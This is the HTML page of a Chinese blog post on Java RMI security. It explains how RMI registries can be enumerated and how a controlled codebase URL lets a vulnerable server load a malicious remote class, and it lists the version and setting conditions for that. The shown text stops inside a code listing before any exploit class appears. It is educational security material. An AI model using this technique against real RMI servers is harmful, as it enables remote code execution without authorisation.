@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="从RMI第一篇描述了RMI的通信过程和组成成分，总结一下，一个RMI过程有以下三个参与者：   RMI Registry RMI Server RMI Client   但是对于RMI Registry来说，一般在创建时，就直接和服务器端的一个对象进行绑定，所以最后只有Server和Client两部分代码，而Server中就自然包含了Registry和Server两部分： 12LocateRegi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全[RMI(2)]">
+<meta property="og:url" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/index.html">
+<meta property="og:site_name" content="Ttoc&#39;s blog">
+<meta property="og:description" content="从RMI第一篇描述了RMI的通信过程和组成成分，总结一下，一个RMI过程有以下三个参与者：   RMI Registry RMI Server RMI Client   但是对于RMI Registry来说，一般在创建时，就直接和服务器端的一个对象进行绑定，所以最后只有Server和Client两部分代码，而Server中就自然包含了Registry和Server两部分： 12LocateRegi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924170229091.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924170622609.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924172154462.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924172636783.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014155150325.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014162311620.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014162928158.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017210721617.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014165043675.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014165505720.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014171626991.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017222948310.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017223047942.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017213458878.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017223143987.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921193958356.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921193926761.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921193717284.png">
+<meta property="og:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921194236577.png">
+<meta property="article:published_time" content="2023-09-17T03:11:46.797Z">
+<meta property="article:modified_time" content="2023-12-05T14:19:56.356Z">
+<meta property="article:author" content="Ttoc">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924170229091.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java安全[RMI(2)]</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"><style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+
+
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <li><a href="/">首页</a></li>
+          <li><a href="/archives/">文章</a></li>
+        <li><a href="/search/">搜索</a></li>
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/Java%E5%AE%89%E5%85%A8%5BRMI(3)%5D/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/Java%E5%AE%89%E5%85%A8%5BRMI(1)%5D/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&text=Java安全[RMI(2)]"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&title=Java安全[RMI(2)]"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&is_video=false&description=Java安全[RMI(2)]"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java安全[RMI(2)]&body=Check out this article: https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&title=Java安全[RMI(2)]"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&title=Java安全[RMI(2)]"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&title=Java安全[RMI(2)]"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&title=Java安全[RMI(2)]"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&name=Java安全[RMI(2)]&description=&lt;p&gt;从RMI第一篇描述了RMI的通信过程和组成成分，总结一下，一个RMI过程有以下三个参与者：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;RMI Registry&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;RMI Server&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;RMI Client&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;但是对于RMI Registry来说，一般在创建时，就直接和服务器端的一个对象进行绑定，所以最后只有Server和Client两部分代码，而Server中就自然包含了Registry和Server两部分：&lt;/p&gt;
+&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;LocateRegistry.createRegistry(&lt;span class=&#34;number&#34;&gt;1099&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Naming.bind(&lt;span class=&#34;string&#34;&gt;&amp;quot;rmi://127.0.0.1:1099/Hello&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;RemoteHelloWorld&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;上述代码中，第一行是创建并运行&lt;code&gt;RMI Registry&lt;/code&gt;，第二行是将&lt;code&gt;RemoteHelloWorld&lt;/code&gt;对象绑定到&lt;code&gt;Hello&lt;/code&gt;这个&lt;code&gt;Name&lt;/code&gt;上。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Naming.bind&lt;/code&gt;的第一个参数是&lt;code&gt;url&lt;/code&gt;，格式为&lt;code&gt;rmi://host:post/name&lt;/code&gt;。这里的&lt;code&gt;host&lt;/code&gt;和&lt;code&gt;post&lt;/code&gt;就是&lt;code&gt;RMI Registry&lt;/code&gt;的地址和端口，&lt;code&gt;name&lt;/code&gt;就是远程对象绑定的名字。&lt;/p&gt;
+&lt;p&gt;不过，如果&lt;code&gt;RMI Registry&lt;/code&gt;在本地运行，那么&lt;code&gt;host&lt;/code&gt;和&lt;code&gt;port&lt;/code&gt;是&lt;u&gt;可以省略&lt;/u&gt;的，&lt;code&gt;host&lt;/code&gt;默认为&lt;code&gt;localhost&lt;/code&gt;，&lt;code&gt;port&lt;/code&gt;默认是&lt;code&gt;1099&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;直接保留&lt;code&gt;name&lt;/code&gt;就行，&lt;/p&gt;
+&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Naming.bind(&lt;span class=&#34;string&#34;&gt;&amp;quot;Hello&amp;quot;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;RemoteHelloWorld&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;第一篇大致讲了RMI整体的原理和流程，那么接下来自然要想到RMI会有哪些安全问题，可以分为两个方向&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;如果我们能够访问&lt;code&gt;RMI Registry&lt;/code&gt;，将如何对其进行攻击？&lt;/li&gt;
+&lt;li&gt;如果我们可以控制目标RMI客户端中的&lt;code&gt;Naming.lookup&lt;/code&gt;的第一个参数，也就是&lt;code&gt;RMI Registry&lt;/code&gt;的地址和端口，能不能进行攻击？&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&t=Java安全[RMI(2)]"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%AE%89%E5%85%A8-RMI-2"><span class="toc-number">1.</span> <span class="toc-text">Java安全[RMI(2)]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%94%BB%E5%87%BBRMI-Registry"><span class="toc-number">1.1.</span> <span class="toc-text">如何攻击RMI Registry?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E5%88%A9%E7%94%A8codebase%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">RMI利用codebase执行任意代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99"><span class="toc-number">1.2.1.</span> <span class="toc-text">环境配置和代码编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9Acodebase"><span class="toc-number">1.2.2.</span> <span class="toc-text">指定codebase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%B1%BB"><span class="toc-number">1.2.3.</span> <span class="toc-text">加载恶意类</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java安全[RMI(2)]
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ttoc</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-09-17T03:11:46.797Z" class="dt-published" itemprop="datePublished">2023-09-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java%E6%BC%AB%E8%B0%88%E5%AD%A6%E4%B9%A0/">Java漫谈学习</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>从RMI第一篇描述了RMI的通信过程和组成成分，总结一下，一个RMI过程有以下三个参与者：</p>
+<blockquote>
+<ul>
+<li><code>RMI Registry</code></li>
+<li><code>RMI Server</code></li>
+<li><code>RMI Client</code></li>
+</ul>
+</blockquote>
+<p>但是对于RMI Registry来说，一般在创建时，就直接和服务器端的一个对象进行绑定，所以最后只有Server和Client两部分代码，而Server中就自然包含了Registry和Server两部分：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure>
+
+<p>上述代码中，第一行是创建并运行<code>RMI Registry</code>，第二行是将<code>RemoteHelloWorld</code>对象绑定到<code>Hello</code>这个<code>Name</code>上。</p>
+<p><code>Naming.bind</code>的第一个参数是<code>url</code>，格式为<code>rmi://host:post/name</code>。这里的<code>host</code>和<code>post</code>就是<code>RMI Registry</code>的地址和端口，<code>name</code>就是远程对象绑定的名字。</p>
+<p>不过，如果<code>RMI Registry</code>在本地运行，那么<code>host</code>和<code>port</code>是<u>可以省略</u>的，<code>host</code>默认为<code>localhost</code>，<code>port</code>默认是<code>1099</code></p>
+<p>直接保留<code>name</code>就行，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Naming.bind(<span class="string">&quot;Hello&quot;</span>,<span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure>
+
+<p>第一篇大致讲了RMI整体的原理和流程，那么接下来自然要想到RMI会有哪些安全问题，可以分为两个方向</p>
+<blockquote>
+<ul>
+<li>如果我们能够访问<code>RMI Registry</code>，将如何对其进行攻击？</li>
+<li>如果我们可以控制目标RMI客户端中的<code>Naming.lookup</code>的第一个参数，也就是<code>RMI Registry</code>的地址和端口，能不能进行攻击？</li>
+</ul>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="Java安全-RMI-2"><a href="#Java安全-RMI-2" class="headerlink" title="Java安全[RMI(2)]"></a>Java安全[RMI(2)]</h1><blockquote>
+<p>复现文章过程中遇到了很多问题，本文不全展示，请自行理解和搜索，动手操作学到更多</p>
+</blockquote>
+<h2 id="如何攻击RMI-Registry"><a href="#如何攻击RMI-Registry" class="headerlink" title="如何攻击RMI Registry?"></a>如何攻击RMI Registry?</h2><p>从第一篇RMI文章中提到，服务器端用<code>Naming.rebind</code>绑定对象。比如下面代码就将<code>RemoteHelloWorld</code>类实例绑定在<code>Registry</code>中的<code>Hello</code>名上，<code>192.168.135.142:1099</code>是<code>RMI Registry</code>的地址和端口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://192.168.169.131:1099/Hello&quot;</span>, h);</span><br></pre></td></tr></table></figure>
+
+<p>我们同时也知道在客户端也可以调用<code>Naming</code>，并且可以在<code>RMI Registry</code>中进行<code>lookup</code>查找，如果客户端也进行<code>rebind</code>，可不可以将<code>Hello</code>对应的对象修改覆盖掉呢？</p>
+<p>可以先在本机上启动一个类似的<code>server</code>绑定虚拟机里的<code>Registry</code>，</p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230924170229091.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924170229091.png" alt="image-20230924170229091"></a></p>
+<p>但是发生报错，提示当前并非<code>localhost</code></p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230924170622609.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924170622609.png" alt="image-20230924170622609"></a></p>
+<blockquote>
+<p>这也是因为Java对远程访问<code>RMI Registry</code>做了限制，只有当请求访问的<code>源地址是localhost</code>时候，才可以进行调用<code>rebind,bind,unbind</code>等方法。</p>
+</blockquote>
+<blockquote>
+<p>不过如果至少单纯列出绑定对象或者查找绑定对象，是没有这个限制的，如<code>list</code>和<code>lookup</code>方法是可以远程调用的。</p>
+</blockquote>
+<p>为了更加直观，现在虚拟机的服务器端，绑定了三个Name</p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230924172154462.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924172154462.png" alt="image-20230924172154462"></a></p>
+<p>客户端代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMI_Client_list</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] s = Naming.list(<span class="string">&quot;rmi://192.168.169.131:1099&quot;</span>);</span><br><span class="line">        System.out.println(Arrays.toString(s));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230924172636783.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924172636783.png" alt="image-20230924172636783"></a></p>
+<blockquote>
+<p>lookup作用就是获得某个远程对象。那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用，之前曾经有一个工具 <a target="_blank" rel="noopener" href="https://github.com/NickstaDB/BaRMIe%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%B8%80%E4%B8%AA%E5%8A%9F%E8%83%BD%E5%B0%B1%E6%98%AF%E8%BF%9B%E8%A1%8C%E5%8D%B1%E9%99%A9%E6%96%B9%E6%B3%95%E7%9A%84%E6%8E%A2%E6%B5%8B%E3%80%82">https://github.com/NickstaDB/BaRMIe，其中一个功能就是进行危险方法的探测。</a> 但是显然，RMI的攻击面绝不仅仅是这样没营养。</p>
+</blockquote>
+<h2 id="RMI利用codebase执行任意代码"><a href="#RMI利用codebase执行任意代码" class="headerlink" title="RMI利用codebase执行任意代码"></a>RMI利用<code>codebase</code>执行任意代码</h2><p>大部分的Java的漏洞都是远程进行利用恶意类，但是在怎么让目标服务器能够下载并加载自己的恶意服务器上的恶意类，这里就涉及到了<code>codebase</code>。</p>
+<p>曾经浏览器可以直接运行<code>java</code>，就是通过<code>Applet</code>标签，但是在<code>HTML5</code>中不再支持，并在<code>HTML 4.01</code> 中不赞成使用 <code>&lt;applet&gt;</code> 元素。</p>
+<blockquote>
+<p>Applet 是一种 Java 程序。它一般运行在支持 Java 的 Web 浏览器内。因为它有完整的 Java API支持,所以Applet 是一个全功能的 Java 应用程序。</p>
+<p><code>&lt;applet&gt; 标签在 HTML 4 中用于定义嵌入式小程序（插件）。</code></p>
+</blockquote>
+<p>使用<code>Applet</code>的时候通常需要指定一个<code>codebase</code>属性，如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">applet</span> <span class="attr">code</span>=<span class="string">&quot;HelloWorld.class&quot;</span> <span class="attr">codebase</span>=<span class="string">&quot;Applets&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800&quot;</span> <span class="attr">height</span>=<span class="string">&quot;600&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">applet</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在RMI中远程加载时也同时涉及到了<code>codebase</code></p>
+<blockquote>
+<p><code>codebase</code>是一个地址，<u>告诉Java虚拟机我们应该从哪个地方去搜索类</u>，有点像我们日常用的 <code>CLASSPATH</code>，但<code>CLASSPATH</code>是本地路径，而<code>codebase</code>通常是远程<code>URL</code>，比如<code>http</code>、<code>ftp</code>等。</p>
+</blockquote>
+<p>如果指定<code>codebase=http://example.com/</code>，然后加载<code>org.vulhub.example.Example</code> 类，则java虚拟机就会下载<code>http://example.com/org/vulhub/example/Example.class</code>，并作为<code>Example</code>类的字节码。</p>
+<p>在RMI中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。<strong>如果某一端反序列化时发现一个对象，它会先从自己的<code>CLASSPATH</code>中进行寻找对应的类，如果在本地还是找不到，就会远程去加载<code>codebase</code>中的类。</strong></p>
+<p>所以如果<code>codebase</code>被控制，那么我们写上我们恶意类的<code>CLASSPATH</code>，当服务端本地加载不到的时候，就会通过我们控制的<code>codebase</code>下载恶意类，最后达到加载恶意类的目的。</p>
+<blockquote>
+<p>在RMI中，codebase可以随着序列化数据一起传输，服务端接收到这个数据后，就先在CLASSPATH中寻找，然后去指定的codebase寻找类。最后就可能被<code>codebase</code>指向的恶意类控制导致被getshell或者任意命令执行。</p>
+</blockquote>
+<h3 id="环境配置和代码编写"><a href="#环境配置和代码编写" class="headerlink" title="环境配置和代码编写"></a>环境配置和代码编写</h3><p>环境配置，只有满足如下条件的RMI服务器才能被攻击</p>
+<blockquote>
+<ul>
+<li><p>安装并配置了SecurityManager </p>
+</li>
+<li><p>Java版本低于<code>7u21</code>、<code>6u45</code>，或者设置了 <code>java.rmi.server.useCodebaseOnly=false</code></p>
+</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>其中 <code>java.rmi.server.useCodebaseOnly</code> 是在<code>Java 7u21</code>、<code>6u45</code>的时候修改的一个默认设置： </p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a> </li>
+<li><a target="_blank" rel="noopener" href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></li>
+</ul>
+</blockquote>
+<p>我的环境</p>
+<blockquote>
+<p>配置环境犯了个低级错误，客户端的java版本太高，编译出来的类文件无法被服务器的低版本java虚拟机加载，导致codebase指向的恶意类无法被正确加载</p>
+</blockquote>
+<blockquote>
+<p>服务端：</p>
+<ul>
+<li>ip: <code>192.168.169.136</code></li>
+<li><code>java 17.5</code></li>
+</ul>
+<p>客户端：</p>
+<ul>
+<li>ip: <code>192.168.169.1</code></li>
+<li><code>java 17.0.5</code></li>
+</ul>
+</blockquote>
+<p>服务端的四个文件，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 